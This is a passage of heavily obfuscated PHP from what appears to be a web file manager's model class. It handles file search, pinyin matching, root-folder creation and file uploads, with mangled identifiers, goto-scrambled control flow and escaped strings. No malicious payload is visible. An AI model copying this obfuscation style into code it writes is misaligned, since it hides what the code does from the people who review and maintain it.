$E™¾´ùÅó = array(); $D²Âµî¸Ú… = $Bˆ¸œ¥øÉ¯[$DÑÅÖ˜ËóÁ[2142]]; foreach ($e„‚”‰äàÎ as $Bˆì”ºÊé‰) { $E¥¯ˆÀ–Ê = $Bˆì”ºÊé‰[$DÑÅÖ˜ËóÁ[28]]; $føÕ±•Ä©© = str_replace($DÑÅÖ˜ËóÁ[50], $DÑÅÖ˜ËóÁ[33], Pinyin::encode($E¥¯ˆÀ–Ê)); if (stripos($E¥¯ˆÀ–Ê, $D²Âµî¸Ú…) !== !1 || stripos($føÕ±•Ä©©, $D²Âµî¸Ú…) !== !1) { $E™¾´ùÅó[] = $Bˆì”ºÊé‰[$DÑÅÖ˜ËóÁ[372]]; } } goto eŠ÷ÛÇŸ‹Ò; A¹Ê°Õ«…‘: $d¼Ğ‡Òá“ã = array_to_keyvalue($d¼Ğ‡Òá“ã, $DÑÅÖ˜ËóÁ[33], $DÑÅÖ˜ËóÁ[75]); $Eƒ´ŠÖà‹ = array_unique($d¼Ğ‡Òá“ã); $this->_listSearchMerge($ašç¡Œµ¡Ö, $Bˆ¸œ¥øÉ¯, $eÔèöª® ì, $Eƒ´ŠÖà‹); goto fÆ¤ëôŠ¼·; Aç£‡îÙ’: $DÑÅÖ˜ËóÁ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$Bˆ¸œ¥øÉ¯[$DÑÅÖ˜ËóÁ[2142]] || $ašç¡Œµ¡Ö[$DÑÅÖ˜ËóÁ[356]][$DÑÅÖ˜ËóÁ[345]] > 1) { return; } $e„‚”‰äàÎ = Model($DÑÅÖ˜ËóÁ[2266])->listData(); goto Dä±‚Äƒ½ï; eŠ÷ÛÇŸ‹Ò: if (!$E™¾´ùÅó) { return; } $cæƒ´İ·ñÍ = array($DÑÅÖ˜ËóÁ[398] => array($DÑÅÖ˜ËóÁ[7], $E™¾´ùÅó)); $d¼Ğ‡Òá“ã = Model($DÑÅÖ˜ËóÁ[2267])->field($DÑÅÖ˜ËóÁ[75])->where($cæƒ´İ·ñÍ)->select(); goto A¹Ê°Õ«…‘; fÆ¤ëôŠ¼·: } private function _listSearchDesc(&$dÎÎÛŞÆò, $D‡‘œòÍ„, $DÊÙç¶Ú„) { goto EÄÃ²ç÷; EÄÃ²ç÷: $bŒÂ‚÷‚†Æ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$D‡‘œòÍ„[$bŒÂ‚÷‚†Æ[2142]] || $dÎÎÛŞÆò[$bŒÂ‚÷‚†Æ[356]][$bŒÂ‚÷‚†Æ[345]] > 1) { return; } $f´Øõõ÷Â¬ = $this->listSearchChildren($D‡‘œòÍ„[$bŒÂ‚÷‚†Æ[465]]); goto B÷‹–¶³¡; dœ­—ï›¨: $F åêâë®¨ = Model($bŒÂ‚÷‚†Æ[508])->field($bŒÂ‚÷‚†Æ[374])->where($e°ÆÌçùÑ)->select(); $Aà¬«½¥«‹ = array_to_keyvalue($F åêâë®¨, $bŒÂ‚÷‚†Æ[33], $bŒÂ‚÷‚†Æ[374]); $this->_listSearchMerge($dÎÎÛŞÆò, $D‡‘œòÍ„, $DÊÙç¶Ú„, $Aà¬«½¥«‹); goto a Ñàå÷ë; B÷‹–¶³¡: $f´Øõõ÷Â¬ = array_unique($f´Øõõ÷Â¬); if (!$f´Øõõ÷Â¬) { return; } $e°ÆÌçùÑ = array($bŒÂ‚÷‚†Æ[374] => array($bŒÂ‚÷‚†Æ[7], $f´Øõõ÷Â¬), $bŒÂ‚÷‚†Æ[89] => $bŒÂ‚÷‚†Æ[409], $bŒÂ‚÷‚†Æ[364] => array($bŒÂ‚÷‚†Æ[750], $bŒÂ‚÷‚†Æ[2144] . $D‡‘œòÍ„[$bŒÂ‚÷‚†Æ[2142]] . $bŒÂ‚÷‚†Æ[2144])); goto dœ­—ï›¨; a Ñàå÷ë: } private function _listSearchMerge(&$c›õÃÊŠ¢», $FÁ®«¥Òø¦, $EÁ–á¦İ, $fØÕÅ¬²´¦) { goto EìåÂäÂÈÙ; EìåÂäÂÈÙ: $D—§É›èš =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$fØÕÅ¬²´¦) { return; } $f÷šÜ‘™©“ = array_to_keyvalue($c›õÃÊŠ¢»[$D—§É›èš[359]], $D—§É›èš[33], $D—§É›èš[374]); goto FÍ²™®×Ê‰; Föˆ¦Â¹¢í: $dà„‚Æ« = $this->field($EÁ–á¦İ)->where($e„Şº …‘‡)->select(); if (!$dà„‚Æ«) { return; } $cº…Ú¤¤œö = array(); goto CÄ …§Ğ; FÍ²™®×Ê‰: $cç³³ßÄ÷ = array_diff($fØÕÅ¬²´¦, $f÷šÜ‘™©“); if (!$cç³³ßÄ÷) { return; } $e„Şº …‘‡ = array($D—§É›èš[374] => array($D—§É›èš[7], $cç³³ßÄ÷)); goto Föˆ¦Â¹¢í; CÄ …§Ğ: foreach ($dà„‚Æ« as $CÜ¶æ©Åä‘) { $eÏ”Í‡ÜÖ = $D—§É›èš[47] . $FÁ®«¥Òø¦[$D—§É›èš[465]] . $D—§É›èš[47]; if (stripos($CÜ¶æ©Åä‘[$D—§É›èš[463]], $eÏ”Í‡ÜÖ) !== !1) { $cº…Ú¤¤œö[] = $CÜ¶æ©Åä‘; } } $c›õÃÊŠ¢»[$D—§É›èš[359]] = array_merge($cº…Ú¤¤œö, $c›õÃÊŠ¢»[$D—§É›èš[359]]); $c›õÃÊŠ¢»[$D—§É›èš[356]][$D—§É›èš[357]] += count($cº…Ú¤¤œö); goto aéä†¸Éİ›; aéä†¸Éİ›: } public function listSearchChildren($a„¿Ô¢¿·„, $D¤¶ŠÃß‘™ = 5000) { goto aƒÁªùƒ¬Ğ; f“î·éÃùâ: $Cì°ø‹’Öà = array($DêğÕÆ¼¾Š[463] => array($DêğÕÆ¼¾Š[750], $Aœí¾Ÿå‹‹[$DêğÕÆ¼¾Š[463]] . $Aœí¾Ÿå‹‹[$DêğÕÆ¼¾Š[374]] . $DêğÕÆ¼¾Š[488])); $DÌ‹‚†™âÍ = $this->field($DêğÕÆ¼¾Š[374])->cache(null, 600)->where($Cì°ø‹’Öà)->count(); if ($DÌ‹‚†™âÍ > $D¤¶ŠÃß‘™) { return $this->_listSearchChildrenNear($a„¿Ô¢¿·„, $D¤¶ŠÃß‘™); } goto cÙÕô´±ï; aƒÁªùƒ¬Ğ: $DêğÕÆ¼¾Š =& $_SERVER[ºÖÙÂŒäÉê‡]; $Cì‘ÅßÂó = array(); $Aœí¾Ÿå‹‹ = $this->sourceInfo($a„¿Ô¢¿·„); goto f“î·éÃùâ; cÙÕô´±ï: $c¼“ã¹ŒÎµ = $this->field($DêğÕÆ¼¾Š[374])->where($Cì°ø‹’Öà)->select(); $Cì‘ÅßÂó = array_to_keyvalue($c¼“ã¹ŒÎµ, $DêğÕÆ¼¾Š[33], $DêğÕÆ¼¾Š[374]); return $Cì‘ÅßÂó; goto Eù¬º‚¦¹•; Eù¬º‚¦¹•: } private function _listSearchChildrenNear($Eƒãæ±˜‡ù, $aÜôó…çÅÜ) { goto A„´œì¿ºî; aÅÙµÃÑ”²: $F£´¸£ƒÏ— = array_merge($F£´¸£ƒÏ—, array_to_keyvalue($bì·ñíÉ…, $aŒæ‰ÍëÂ[33], $aŒæ‰ÍëÂ[374])); $F£´¸£ƒÏ— = array_slice($F£´¸£ƒÏ—, 0, $aÜôó…çÅÜ); return $F£´¸£ƒÏ—; goto c×´ç’†Ê; A„´œì¿ºî: $aŒæ‰ÍëÂ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F£´¸£ƒÏ— = array(); $Aˆºêäó¢Ø = array($aŒæ‰ÍëÂ[465] => $Eƒãæ±˜‡ù); goto Bˆ½¨è»ìé; Bˆ½¨è»ìé: $bì·ñíÉ… = $this->field($aŒæ‰ÍëÂ[2268])->where($Aˆºêäó¢Ø)->select(); $DĞ®È±÷‚´ = array_to_keyvalue(array_filter_by_field($bì·ñíÉ…, $aŒæ‰ÍëÂ[375], $aŒæ‰ÍëÂ[83]), $aŒæ‰ÍëÂ[33], $aŒæ‰ÍëÂ[374]); $F£´¸£ƒÏ— = array_merge($F£´¸£ƒÏ—, array_to_keyvalue($bì·ñíÉ…, $aŒæ‰ÍëÂ[33], $aŒæ‰ÍëÂ[374])); goto bˆ”ØÌï´§; bˆ”ØÌï´§: if (!$DĞ®È±÷‚´) { return $F£´¸£ƒÏ—; } $Aˆºêäó¢Ø = array($aŒæ‰ÍëÂ[465] => array($aŒæ‰ÍëÂ[7], $DĞ®È±÷‚´)); $bì·ñíÉ… = $this->field($aŒæ‰ÍëÂ[2268])->where($Aˆºêäó¢Ø)->select(); goto aÅÙµÃÑ”²; c×´ç’†Ê: } private function _listSearchBindPinyin($aáêšŒ˜„º, &$E‘ôØæœ¿ï, &$D“ÁÇç¦Àâ) { goto d‡“¿ÆÍ† ; AÏ…â¤³Óë: unset($E‘ôØæœ¿ï[$F³‰ò§«ª—[28]]); foreach ($E‘ôØæœ¿ï as $dä„Ó…ëëÏ => $F¯óµ¨«…) { $E‰ºç´ñÛ×[$F³‰ò§«ª—[2270] . $dä„Ó…ëëÏ] = $F¯óµ¨«…; } $a…£‰šçñÕ = array($F³‰ò§«ª—[487], $F³‰ò§«ª—[2144] . $aáêšŒ˜„º[$F³‰ò§«ª—[2142]] . $F³‰ò§«ª—[2144]); goto c¹‡ÎÂ‡‰; c´©ªïİ”ï: $E‰ºç´ñÛ× = array(); $D“ÁÇç¦Àâ = str_replace(array($F³‰ò§«ª—[174], $F³‰ò§«ª—[50], $F³‰ò§«ª—[2269]), $F³‰ò§«ª—[33], $D“ÁÇç¦Àâ); $D“ÁÇç¦Àâ = $F³‰ò§«ª—[2270] . str_replace($F³‰ò§«ª—[47], $F³‰ò§«ª—[2271], $D“ÁÇç¦Àâ); goto AÏ…â¤³Óë; d‡“¿ÆÍ† : $F³‰ò§«ª— =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!Input::check($aáêšŒ˜„º[$F³‰ò§«ª—[2142]], $F³‰ò§«ª—[311]) || strlen($aáêšŒ˜„º[$F³‰ò§«ª—[2142]]) < 2) { return; } $eˆ¬Ü²¥î• = "\114\105\x46\x54\40\112\117\111\116\40{$this->tablePrefix}\x69\157\x5f\163\x6f\x75\162\143\145\x5f\155\x65\x74\141\40\x6d\x65\x74\x61\x20\157\156\x20\x73\x6f\x75\162\x63\x65\56\163\x6f\165\162\143\145\x49\x44\40\75\x20\x6d\x65\164\x61\56\163\x6f\x75\162\143\x65\x49\x44"; goto c´©ªïİ”ï; c¹‡ÎÂ‡‰: $E‰ºç´ñÛ×[] = array($F³‰ò§«ª—[2272] => $a…£‰šçñÕ, $F³‰ò§«ª—[906] => $F³‰ò§«ª—[2146], array($F³‰ò§«ª—[2273] => $a…£‰šçñÕ, $F³‰ò§«ª—[2274] => array($F³‰ò§«ª—[7], array($F³‰ò§«ª—[420], $F³‰ò§«ª—[419])))); $this->join($eˆ¬Ü²¥î•); $E‘ôØæœ¿ï = $E‰ºç´ñÛ×; goto B–ÎÜ¸¶¢; B–ÎÜ¸¶¢: } private function _parseSearchWhere($F™×Ì•ì¶°) { goto bÒî–Ôä¤; F‘í–Ë‹ÛÔ: if (isset($F™×Ì•ì¶°[$FµÜ³ùÜ·[2142]]) && $F™×Ì•ì¶°[$FµÜ³ùÜ·[2142]]) { $d“ìöŠ½Ú… = $F™×Ì•ì¶°[$FµÜ³ùÜ·[2142]]; $FŒØˆñª• = explode($FµÜ³ùÜ·[50], $d“ìöŠ½Ú…); if (strlen($d“ìöŠ½Ú…) > 2 && (substr($d“ìöŠ½Ú…, 0, 1) == $FµÜ³ùÜ·[112] && substr($d“ìöŠ½Ú…, -1) == $FµÜ³ùÜ·[112]) || substr($d“ìöŠ½Ú…, 0, 1) == $FµÜ³ùÜ·[55] && substr($d“ìöŠ½Ú…, -1) == $FµÜ³ùÜ·[55]) { $d“ìöŠ½Ú… = substr($d“ìöŠ½Ú…, 1, -1); $FŒØˆñª• = array($d“ìöŠ½Ú…); } $a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[28]] = array($FµÜ³ùÜ·[487], $FµÜ³ùÜ·[2144] . $d“ìöŠ½Ú… . $FµÜ³ùÜ·[2144]); if (count($FŒØˆñª•) > 1) { $a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[28]] = array(); foreach ($FŒØˆñª• as $aàùÀé¢†¬) { if (!trim($aàùÀé¢†¬)) { continue; } $a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[28]][] = array($FµÜ³ùÜ·[487], $FµÜ³ùÜ·[2144] . trim($aàùÀé¢†¬) . $FµÜ³ùÜ·[2144]); } } } return $a²‘Œ¿Ï‰Ç; goto Aì›¹·ç‘; bÒî–Ôä¤: $FµÜ³ùÜ· =& $_SERVER[ºÖÙÂŒäÉê‡]; $a²‘Œ¿Ï‰Ç = array(); if (isset($F™×Ì•ì¶°[$FµÜ³ùÜ·[699]])) { $a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[106]] = array($FµÜ³ùÜ·[2275], $F™×Ì•ì¶°[$FµÜ³ùÜ·[699]]); } goto CÃâ’õ„‹; CÃâ’õ„‹: if (isset($F™×Ì•ì¶°[$FµÜ³ùÜ·[700]])) { $bª£¤¤Ÿ = array($FµÜ³ùÜ·[2276], $F™×Ì•ì¶°[$FµÜ³ùÜ·[700]]); if ($a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[106]]) { $a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[106]] = array($a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[106]], $bª£¤¤Ÿ, $FµÜ³ùÜ·[2277]); } else { $a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[106]] = $bª£¤¤Ÿ; } } if (isset($F™×Ì•ì¶°[$FµÜ³ùÜ·[2278]])) { $a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[77]] = array($FµÜ³ùÜ·[2275], $F™×Ì•ì¶°[$FµÜ³ùÜ·[2278]]); } if (isset($F™×Ì•ì¶°[$FµÜ³ùÜ·[2279]])) { $bª£¤¤Ÿ = array($FµÜ³ùÜ·[2276], $F™×Ì•ì¶°[$FµÜ³ùÜ·[2279]]); if ($a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[77]]) { $a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[77]] = array($a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[77]], $bª£¤¤Ÿ, $FµÜ³ùÜ·[2277]); } else { $a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[77]] = $bª£¤¤Ÿ; } } goto B¼ğ–—§Ô©; B¼ğ–—§Ô©: if (isset($F™×Ì•ì¶°[$FµÜ³ùÜ·[539]])) { $a²‘Œ¿Ï‰Ç[] = array($FµÜ³ùÜ·[384] => $F™×Ì•ì¶°[$FµÜ³ùÜ·[539]], $FµÜ³ùÜ·[383] => $F™×Ì•ì¶°[$FµÜ³ùÜ·[539]], $FµÜ³ùÜ·[906] => $FµÜ³ùÜ·[2146]); } if (isset($F™×Ì•ì¶°[$FµÜ³ùÜ·[377]])) { $a®¢…”ìã… = $F™×Ì•ì¶°[$FµÜ³ùÜ·[377]]; if ($a®¢…”ìã… == $FµÜ³ùÜ·[76]) { $a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[375]] = 1; } else { if ($a®¢…”ìã… == $FµÜ³ùÜ·[2280]) { $a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[375]] = 0; } else { if ($a®¢…”ìã…) { $a®¢…”ìã… = is_array($a®¢…”ìã…) ? $a®¢…”ìã… : explode($FµÜ³ùÜ·[47], $a®¢…”ìã…); $a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[377]] = array($FµÜ³ùÜ·[389], $a®¢…”ìã…); $a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[375]] = 0; } } } } if (isset($F™×Ì•ì¶°[$FµÜ³ùÜ·[465]])) { $eˆ±…ò”°‹ = $this->sourceInfo($F™×Ì•ì¶°[$FµÜ³ùÜ·[465]]); $a²‘Œ¿Ï‰Ç[$FµÜ³ùÜ·[529]] = array($FµÜ³ùÜ·[487], $eˆ±…ò”°‹[$FµÜ³ùÜ·[463]] . $F™×Ì•ì¶°[$FµÜ³ùÜ·[465]] . $FµÜ³ùÜ·[488]); } goto F‘í–Ë‹ÛÔ; Aì›¹·ç‘: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($dõÒ–‘ªÜÆ) { $dèåÚ´Šé™ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fÚô«ß™ğ = Model($dèåÚ´Šé™[478])->where(array($dèåÚ´Šé™[1394] => $dõÒ–‘ªÜÆ))->find(); $bÚé˜ŒŠ = $this->_mkdirRoot(SourceModel::TYPE_USER, $dõÒ–‘ªÜÆ, $fÚô«ß™ğ[$dèåÚ´Šé™[28]]); $this->userDesktopAdd($bÚé˜ŒŠ); return $bÚé˜ŒŠ; } public function userDesktopAdd($d´ŸãÃ¨÷…) { $C´åè·ºƒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bÑ‚ßñÆÑğ = LNG($C´åè·ºƒ[2281]); $b¿Óáˆ¹ª£ = $this->mkdir($d´ŸãÃ¨÷…, $bÑ‚ßñÆÑğ); $this->metaSet($b¿Óáˆ¹ª£, $C´åè·ºƒ[2282], $C´åè·ºƒ[83]); $this->metaSet($d´ŸãÃ¨÷…, $C´åè·ºƒ[2283], $b¿Óáˆ¹ª£); } public function groupRootAdd($a§§òó¶‡Õ) { $bôµôİÒêÄ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cö…‡ËÌñò = Model($bôµôİÒêÄ[462])->where(array($bôµôİÒêÄ[2138] => $a§§òó¶‡Õ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $a§§òó¶‡Õ, $cö…‡ËÌñò[$bôµôİÒêÄ[28]]); } public function systemRootPathAdd($e£§ÛëÖšª) { if ($e£§ÛëÖšª != $_SERVER[ºÖÙÂŒäÉê‡][1079]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $e£§ÛëÖšª); } public function userRootRemove($Dó•Óéòğ«) { $cˆê¤”ƒÊ£ = $this->sourceRoot(SourceModel::TYPE_USER, $Dó•Óéòğ«); if (!$cˆê¤”ƒÊ£) { return; } $this->remove($cˆê¤”ƒÊ£, !1); } public function groupRootRemove($fİÃÔëÈ¯) { $F„¾ƒÚµã¾ = $this->sourceRoot(SourceModel::TYPE_GROUP, $fİÃÔëÈ¯); if (!$F„¾ƒÚµã¾) { return; } $this->remove($F„¾ƒÚµã¾, !1); } private function _mkdirRoot($DÒâÓËšñÅ, $DÅ‹·•›±, $B¼š·Û§µ) { goto B‰¿ÍÛ·˜§; aÉàæ™Ì½Í: $CÏßÓ¹Ïµ™ = "\115\157\x64\x65\154\x53\157\x75\x72\143\x65\x2e\x6d\153\x64\x69\x72\x52\x6f\157\164\56{$DÒâÓËšñÅ}\56{$DÅ‹·•›±}\x2e" . $B¼š·Û§µ; CacheLock::lock($CÏßÓ¹Ïµ™); $Aª†ÀôŞÛ˜[$d–„ëÎÚåĞ[28]] = $B¼š·Û§µ; goto F©³Æ¤ÈÜ¸; F©³Æ¤ÈÜ¸: $BŸÇì–³ = $this->add($Aª†ÀôŞÛ˜); $BŒÃÉ§êÉç = array($d–„ëÎÚåĞ[531] => short_id($BŸÇì–³)); $this->where(array($d–„ëÎÚåĞ[388] => $BŸÇì–³))->save($BŒÃÉ§êÉç); goto dš‡ˆ“î; dš‡ˆ“î: CacheLock::unlock($CÏßÓ¹Ïµ™); return $BŸÇì–³; goto cÏŠîÂ­ê‰; B‰¿ÍÛ·˜§: $d–„ëÎÚåĞ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Aª†ÀôŞÛ˜ = array($d–„ëÎÚåĞ[373] => 0, $d–„ëÎÚåĞ[525] => $DÒâÓËšñÅ, $d–„ëÎÚåĞ[526] => $DÅ‹·•›±, $d–„ëÎÚåĞ[522] => 1, $d–„ëÎÚåĞ[527] => USER_ID, $d–„ëÎÚåĞ[528] => USER_ID, $d–„ëÎÚåĞ[523] => $d–„ëÎÚåĞ[33], $d–„ëÎÚåĞ[529] => $d–„ëÎÚåĞ[474], $d–„ëÎÚåĞ[400] => 0, $d–„ëÎÚåĞ[524] => 0, $d–„ëÎÚåĞ[424] => 0, $d–„ëÎÚåĞ[530] => $d–„ëÎÚåĞ[33]); if ($DïÜ³êãàà = $this->where($Aª†ÀôŞÛ˜)->find()) { return $DïÜ³êãàà[$d–„ëÎÚåĞ[374]]; } goto aÉàæ™Ì½Í; cÏŠîÂ­ê‰: } private function sourceRoot($c…Çµ‹®°Œ, $fß„‡Ÿª¢¬, $fîÔ¨²ºµ« = false) { $fÌæÕßáì =& $_SERVER[ºÖÙÂŒäÉê‡]; $C°¹£Å—¡à = array($fÌæÕßáì[373] => 0, $fÌæÕßáì[525] => $c…Çµ‹®°Œ, $fÌæÕßáì[526] => $fß„‡Ÿª¢¬); if ($AÛ¢öâ’İ˜ = $this->where($C°¹£Å—¡à)->find()) { return $fîÔ¨²ºµ« ? $AÛ¢öâ’İ˜ : $AÛ¢öâ’İ˜[$fÌæÕßáì[374]]; } return !1; } public function sourceRootGroup($CèÎˆ‡®®) { $F›æ–†©´„ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (is_string($CèÎˆ‡®®)) { $CèÎˆ‡®® = array($CèÎˆ‡®®); } $b£ß—å×ÎË = array($F›æ–†©´„[373] => 0, $F›æ–†©´„[525] => SourceModel::TYPE_GROUP, $F›æ–†©´„[526] => array($F›æ–†©´„[7], $CèÎˆ‡®®)); $bî®§Œæß× = $this->listSource($b£ß—å×ÎË, 1000); return array_to_keyvalue($bî®§Œæß×[$F›æ–†©´„[74]], $F›æ–†©´„[460]); } public function mkfile($Aßä…ÔïèÕ, $Côìâø, $aÌ¦İ •É¤ = '', $Aï™Å½á¥Ï = REPEAT_RENAME) { $cˆÉˆ­˜¥ô =& $_SERVER[ºÖÙÂŒäÉê‡]; $C¬„ÑÙ÷Ë… = Model($cˆÉˆ­˜¥ô[548])->addFileByContent($aÌ¦İ •É¤, $Côìâø); return $this->_createFileCall($Aßä…ÔïèÕ, $Côìâø, $C¬„ÑÙ÷Ë…, $Aï™Å½á¥Ï, $cˆÉˆ­˜¥ô[1108]); } public function addFile($DáÅôÜÆÎŠ, $Bàˆ¦—¡½, $Bâ›¦²†ê™, $Cëí×ğˆ’Ç = false, $bò¤ÎæÊ‹ = REPEAT_RENAME) { $DÒ´„«ÄÒ• = Model($_SERVER[ºÖÙÂŒäÉê‡][548])->addFile($Bàˆ¦—¡½, $Bâ›¦²†ê™, $Cëí×ğˆ’Ç); return $this->_createFileCall($DáÅôÜÆÎŠ, $Bâ›¦²†ê™, $DÒ´„«ÄÒ•, $bò¤ÎæÊ‹); } public function addFileByFileID($E•’ÈºÔİ, $FµÍ…çÉ½ë, $b¾±šˆãŸ, $Aà‡Ñİ¹¯ = REPEAT_RENAME) { $fÛ«‚®÷˜ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b—¸º²¹í = Model($fÛ«‚®÷˜[548])->find($FµÍ…çÉ½ë); Model($fÛ«‚®÷˜[548])->linkAdd($FµÍ…çÉ½ë); return $this->_createFileCall($E•’ÈºÔİ, $b¾±šˆãŸ, $b—¸º²¹í, $Aà‡Ñİ¹¯); } public function addFileByRemote($d¡Ôäå—ö , $C£¿Ñ•ë£“, $A¨Õ‡½È¾Ç, $b“ëàõŸ¾Æ = array(), $fá·Ûç¢Ö = REPEAT_RENAME) { $c‚«òô¸¦µ = Model($_SERVER[ºÖÙÂŒäÉê‡][548])->addFileByRemote($C£¿Ñ•ë£“, $A¨Õ‡½È¾Ç, $b“ëàõŸ¾Æ); return $this->_createFileCall($d¡Ôäå—ö , $A¨Õ‡½È¾Ç, $c‚«òô¸¦µ, $fá·Ûç¢Ö); } private function _createFileCall($EÎáÍÓÌÑ¨, $AÜÜ£¸µìÔ, $eÏ·Ü¥¥®¹, $C†—ó†ƒø, $CºÏÆêöå = "\x75\160\x6c\157\141\x64") { goto B“å‚©¢é; B“å‚©¢é: $bªë¿™ÉØ =& $_SERVER[ºÖÙÂŒäÉê‡]; $a‡ÑŠ¯Ñé = !1; $this->lockWriteStart($EÎáÍÓÌÑ¨, $AÜÜ£¸µìÔ); goto EÒÀğå¶¡; EÒÀğå¶¡: $cî‹¾¿“ó³ = $this->_createFile($EÎáÍÓÌÑ¨, $AÜÜ£¸µìÔ, $eÏ·Ü¥¥®¹, $C†—ó†ƒø, $a‡ÑŠ¯Ñé); if (!$a‡ÑŠ¯Ñé) { Model($bªë¿™ÉØ[426])->remove($eÏ·Ü¥¥®¹[$bªë¿™ÉØ[423]]); } else { if ($cî‹¾¿“ó³) { Model($bªë¿™ÉØ[2253])->eventCreate($cî‹¾¿“ó³, $CºÏÆêöå); } } $this->lockWriteEnd($EÎáÍÓÌÑ¨, $AÜÜ£¸µìÔ); goto f„Ê•Š‹Í„; f„Ê•Š‹Í„: return $cî‹¾¿“ó³; goto Bß‡Š¢–±”; Bß‡Š¢–±”: } public function mkdir($cÎÁ‰Àøñ÷, $bä¶­½è‚, $bË¡å–šõ = REPEAT_SKIP) { goto fœ¯µ×Ù; f©¡¾Ê¸”: $B™â¥½ï’â = $this->_addSoure($E¨È®…ˆ°Ó, $f£èÏŠ¸); Model($cÅÒ÷ÒªÕŠ[2253])->eventCreate($B™â¥½ï’â, $cÅÒ÷ÒªÕŠ[1109]); $this->lockWriteEnd($cÎÁ‰Àøñ÷, $bä¶­½è‚); goto Aó¡ìÈŒ°; fœ¯µ×Ù: $cÅÒ÷ÒªÕŠ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f£èÏŠ¸ = $this->sourceInfo($cÎÁ‰Àøñ÷); if (!$f£èÏŠ¸) { return !1; } goto CäôÅ¸‡¯í; CäôÅ¸‡¯í: $this->lockWriteStart($cÎÁ‰Àøñ÷, $bä¶­½è‚); if ($bË¡å–šõ !== !1) { $dƒˆñÃË = $this->fileNameExist($cÎÁ‰Àøñ÷, $bä¶­½è‚); if ($dƒˆñÃË && $bË¡å–šõ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($cÎÁ‰Àøñ÷, $bä¶­½è‚); return $dƒˆñÃË; } $bä¶­½è‚ = $this->fileNameAuto($cÎÁ‰Àøñ÷, $bä¶­½è‚, $bË¡å–šõ); } $E¨È®…ˆ°Ó = array($cÅÒ÷ÒªÕŠ[522] => 1, $cÅÒ÷ÒªÕŠ[391] => $bä¶­½è‚, $cÅÒ÷ÒªÕŠ[523] => $cÅÒ÷ÒªÕŠ[33], $cÅÒ÷ÒªÕŠ[424] => 0, $cÅÒ÷ÒªÕŠ[524] => 0); goto f©¡¾Ê¸”; Aó¡ìÈŒ°: return $B™â¥½ï’â; goto EÌ¿¡àÄ¸ö; EÌ¿¡àÄ¸ö: } private function _createFile($DĞ¤Òë•ˆ, $d Ä¶ê»‰Â, $f‡ô¦ñ„Ğ», $cèˆšø•Ê, &$b¿ÌëÕ‚œÏ) { goto A†¢¤’’ŸÜ; fˆ¿ÃßôÒ: return $aÁ†¡Ğê¼ˆ; goto f¿¦ä÷‰×º; C™ÊÁÇŒ„ò: if ($cèˆšø•Ê !== !1) { $B—Ò”ã’£º = $this->fileNameExist($DĞ¤Òë•ˆ, $d Ä¶ê»‰Â); } $b¿ÌëÕ‚œÏ = !0; if ($cèˆšø•Ê && $B—Ò”ã’£º) { if ($cèˆšø•Ê == REPEAT_SKIP) { $b¿ÌëÕ‚œÏ = !1; return $B—Ò”ã’£º; } else { if ($cèˆšø•Ê == REPEAT_REPLACE) { $D„…² Åˆ = $this->sourceInfo($B—Ò”ã’£º); $dÇ±ÚÊ­„š = $this->fileHistory($D„…² Åˆ, $f‡ô¦ñ„Ğ»[$a…Ï¼‡Î¤õ[423]], $f‡ô¦ñ„Ğ»[$a…Ï¼‡Î¤õ[77]]); if (!$dÇ±ÚÊ­„š) { $b¿ÌëÕ‚œÏ = !1; } else { $this->folderSizeReset($DĞ¤Òë•ˆ); } return $B—Ò”ã’£º; } else { $d Ä¶ê»‰Â = $this->fileNameAuto($DĞ¤Òë•ˆ, $d Ä¶ê»‰Â, $cèˆšø•Ê, !1); } } } goto b¿ÊªêîÜÖ; b¿ÊªêîÜÖ: $cÛ¬ØÁ¦Éë = array($a…Ï¼‡Î¤õ[522] => 0, $a…Ï¼‡Î¤õ[391] => $d Ä¶ê»‰Â, $a…Ï¼‡Î¤õ[523] => get_path_ext($d Ä¶ê»‰Â), $a…Ï¼‡Î¤õ[424] => $f‡ô¦ñ„Ğ»[$a…Ï¼‡Î¤õ[423]], $a…Ï¼‡Î¤õ[524] => $f‡ô¦ñ„Ğ»[$a…Ï¼‡Î¤õ[77]]); $aÁ†¡Ğê¼ˆ = $this->_addSoure($cÛ¬ØÁ¦Éë, $bÆå•…§ÂÃ); $this->folderSizeReset($DĞ¤Òë•ˆ); goto fˆ¿ÃßôÒ; A†¢¤’’ŸÜ: $a…Ï¼‡Î¤õ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bÆå•…§ÂÃ = $this->sourceInfo($DĞ¤Òë•ˆ); if (!$f‡ô¦ñ„Ğ» || !$bÆå•…§ÂÃ) { return !1; } goto C™ÊÁÇŒ„ò; f¿¦ä÷‰×º: } protected function fileHistory($DÔø‘‹ ÍÜ, $a¶÷·œ†Øà, $aí±÷‚‰) { goto aÜ„¥˜é³; aÜ„¥˜é³: $B¤öĞè²Äó =& 